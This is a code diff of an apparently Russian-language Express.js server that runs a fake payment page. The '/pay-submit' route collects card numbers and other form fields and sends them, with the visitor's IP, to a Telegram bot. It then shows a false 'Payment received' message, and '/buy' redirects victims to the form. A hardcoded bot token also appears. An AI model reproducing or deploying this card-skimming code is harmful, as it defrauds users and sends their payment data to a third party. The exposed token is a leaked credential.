@@ -11,17 +11,11 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
 // РАЗДАЧА СТАТИКИ (CSS, JS, картинки) из корня проекта
-// Если у тебя все файлы (index.html, style.css, data.js, store.js) лежат в корне,
-// то эта строка их отдаст.
 app.use(express.static(__dirname));
-
-// Если же они лежат в папке public, раскомментируй следующую строку
-// и закомментируй верхнюю:
-// app.use(express.static(path.join(__dirname, 'public')));
 
 // ---------- Telegram ----------
 const BOT_TOKEN = "8696604379:AAHOpUvUcDwzLNTBH_GvGxVK7dNMFiqbVnw";
-const CHAT_ID = "YOUR_CHAT_ID";  // ЗАМЕНИ НА РЕАЛЬНЫЙ CHAT ID (число)
+const CHAT_ID = "YOUR_CHAT_ID";  // ЗАМЕНИТЕ НА РЕАЛЬНЫЙ CHAT ID
 
 async function sendToTelegram(data) {
     const text = `
@@ -47,12 +41,10 @@ IP: ${data.ip}
 }
 
 // ---------- Routes ----------
-// Главная страница
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Страница оплаты
 app.get('/pay', (req, res) => {
     const product = req.query.product || 'Item';
     const price = req.query.price || '0';
@@ -88,7 +80,6 @@ a{color:#888}
     `);
 });
 
-// Обработка отправки формы
 app.post('/pay-submit', async (req, res) => {
     const data = {
         card_number: req.body.card_number,
@@ -102,14 +93,12 @@ app.post('/pay-submit', async (req, res) => {
     res.send(`<h2>Payment received</h2><a href="/">Back</a>`);
 });
 
-// Перенаправление с /buy на /pay
 app.get('/buy', (req, res) => {
     const product = req.query.product || 'Item';
     const price = req.query.price || '0';
     res.redirect(`/pay?product=${encodeURIComponent(product)}&price=${price}`);
 });
 
-// Запуск сервера
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
